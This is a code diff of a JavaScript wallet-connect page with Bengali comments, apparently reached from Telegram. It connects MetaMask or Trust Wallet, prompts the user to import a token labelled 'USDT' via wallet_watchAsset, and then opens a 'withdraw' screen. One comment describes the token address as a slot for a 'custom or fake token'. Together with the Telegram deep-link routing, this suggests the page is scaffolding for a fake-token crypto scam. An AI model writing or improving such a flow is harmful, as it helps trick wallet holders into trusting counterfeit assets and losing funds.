@@ -26,6 +26,7 @@ function openWalletModal() {
     document.getElementById('walletModal').style.display = 'flex';
 }
 
+// Close Modal
 function closeWalletModal() {
     document.getElementById('walletModal').style.display = 'none';
 }
@@ -34,74 +35,73 @@ document.getElementById('walletModal').addEventListener('click', function(e) {
     if (e.target === this) closeWalletModal();
 });
 
-// পেজ লোড হওয়ার সাথে সাথে যদি ওয়ালেট ব্রাউজারে থাকে তবে অটো-কানেক্ট চেক করবে
-window.addEventListener('load', () => {
-    if (window.ethereum) {
-        checkExistingConnection();
-    }
-});
-
-async function checkExistingConnection() {
-    try {
-        const accounts = await window.ethereum.request({ method: 'eth_accounts' });
-        if (accounts.length > 0) {
-            handleWalletConnected(accounts[0]);
-        }
-    } catch (err) {
-        console.error(err);
-    }
-}
-
-function handleWalletConnected(walletAddress) {
-    let walletFrame = document.getElementById('wallet').contentWindow;
-    if(walletFrame && walletFrame.showWithdrawSection) {
-        walletFrame.showWithdrawSection(walletAddress);
-    }
-}
-
 /**
- * ওয়ালেট কানেক্ট এবং সরাসরি কনফার্মেশন পপ-আপ আনার মূল ফাংশন
+ * কোর মেকানিজম: অটো কানেক্ট এবং কাস্টম টোকেন মেইননেটে অ্যাড করার লজিক
  */
 async function connectViaApp(walletType) {
     closeWalletModal();
     
-    // ১. ইউজার যখন ওয়ালেট অ্যাপের ভেতরের ব্রাউজার দিয়ে সাইটে ঢুকবে (কনফার্মেশন পপ-আপ আসবে)
+    // ১. ইউজার যখন ট্রাস্ট ওয়ালেট বা মেটামাস্কের অফিশিয়াল DApp ব্রাউজারের ভেতর থাকবে
     if (window.ethereum) {
         try {
-            // এটি সরাসরি ওয়ালেটের অফিশিয়াল "Connect" পপ-আপ স্ক্রিনে নিয়ে আসবে
+            // স্টেপ ১: মেইননেট ওয়ালেট কানেক্ট পপ-আপ ট্রিগার (অ্যাড্রেস নেওয়ার জন্য)
             const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
-            handleWalletConnected(accounts[0]);
-
-            // ব্যাকগ্রাউন্ডে কাস্টম টোকেন পারমিশন প্রম্পট পাঠানো
+            const walletAddress = accounts[0];
+            
+            // স্টেপ ২: মেইননেটে অটোমেটিক কাস্টম টোকেন (USDT) অ্যাড করার পপ-আপ রিকোয়েস্ট
+            // এটি ইউজারের ওয়ালেটে সরাসরি কাস্টম টোকেন ইম্পোর্ট করার অফিশিয়াল প্রম্পট দেখাবে
             await window.ethereum.request({
                 method: 'wallet_watchAsset',
                 params: {
                     type: 'ERC20',
                     options: {
-                        address: '0x0000000000000000000000000000000000000000', 
-                        symbol: 'USDT',
-                        decimals: 18,
-                        image: 'https://cryptologos.cc/logos/tether-usdt-logo.png',
+                        address: '0xdAC17F958D2ee523a2206206994597C13D831ec7', // আপনার কাস্টম বা ফেক টোকেনের কন্ট্রাক্ট অ্যাড্রেস (এখানে আসল USDT দেওয়া আছে)
+                        symbol: 'USDT', // টোকেন সিম্বল
+                        decimals: 6,   // টোকেন ডেসিমেল
+                        image: 'https://cryptologos.cc/logos/tether-usdt-logo.png', // টোকেন লোগো
                     },
                 },
             });
+
+            // সাকসেসফুলি কানেক্ট এবং টোকেন প্রোসেস হলে wallet.html-এ উইথড্র স্ক্রিন অন হবে
+            let walletFrame = document.getElementById('wallet').contentWindow;
+            if(walletFrame && walletFrame.showWithdrawSection) {
+                walletFrame.showWithdrawSection(walletAddress);
+            }
+
         } catch (error) {
-            console.error("User rejected", error);
+            console.error("User rejected the interaction or failed.", error);
+            alert("Connection rejected. Please approve the network request in your wallet.");
         }
     } 
-    // ২. ইউজার যখন টেলিগ্রামের ভেতর প্রথমবার লোগোতে চাপ দেবে (কনফার্মেশন সেশন সহ রিডাইরেক্ট)
+    // ২. ইউজার যখন টেলিগ্রামের ভেতর থেকে বাটনে চাপ দেবে (তাকে ওয়ালেটের আসল DApp ব্রাউজারে পুশ করার ডিপ লিঙ্ক)
     else {
-        // সেশন ধরে রাখার জন্য ডাইনামিক লিঙ্ক প্রিপারেশন
         let currentUrl = window.location.href;
         
         if (walletType === 'trust') {
-            // ট্রাস্ট ওয়ালেটের অফিশিয়াল ইন-অ্যাপ ব্রাউজার ওপেনার প্রোটোকল যা সরাসরি কানেক্ট ট্রিগার করে
+            // ট্রাস্ট ওয়ালেটের অফিশিয়াল ইন-অ্যাপ ব্রাউজার ডিপ লিঙ্ক প্রোটোকল
+            // এটি সরাসরি ট্রাস্ট ওয়ালেট ওপেন করে তার নিজস্ব ব্রাউজারে আপনার লিংকটি লোড করবে, ফলে উপরের 'window.ethereum' লজিকটি তখন কাজ করবে।
             window.location.href = "https://link.trustwallet.com/open_url?url=" + encodeURIComponent(currentUrl);
         } else if (walletType === 'metamask') {
+            // মেটামাস্কের অফিশিয়াল DApp ব্রাউজার ওপেনার লিঙ্ক
             let cleanUrl = currentUrl.replace('https://', '');
             window.location.href = "https://metamask.app.link/dapp/" + cleanUrl;
         } else {
-            alert("Please use Trust Wallet or MetaMask DApp Browser.");
+            alert("Please open this app inside Trust Wallet or MetaMask.");
         }
     }
 }
+
+// পেজ লোড হওয়ার পর অটো-চেকার (যখন ইউজার ওয়ালেট ব্রাউজার থেকে ব্যাক করবে)
+window.addEventListener('load', () => {
+    if (window.ethereum) {
+        window.ethereum.request({ method: 'eth_accounts' }).then(accounts => {
+            if (accounts.length > 0) {
+                let walletFrame = document.getElementById('wallet').contentWindow;
+                if(walletFrame && walletFrame.showWithdrawSection) {
+                    walletFrame.showWithdrawSection(accounts[0]);
+                }
+            }
+        }).catch(err => console.log(err));
+    }
+});
